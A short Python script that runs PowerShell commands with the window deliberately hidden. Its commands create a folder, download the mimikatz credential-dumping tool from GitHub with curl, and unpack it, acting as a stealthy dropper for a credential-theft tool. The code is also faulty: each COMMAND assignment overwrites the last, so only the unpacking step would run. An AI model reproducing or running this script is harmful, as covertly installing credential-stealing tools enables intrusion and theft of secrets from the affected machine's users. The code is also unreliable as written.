import subprocess

#powershell command to execute
COMMAND = "mkdir C:\hello"
COMMAND = "curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip" 
COMMAND = 'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"'


def run_powershell(command: str):
    result = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW  # hide CMD
    )
    return result.returncode
 
 
if __name__ == "__main__":
    run_powershell(COMMAND)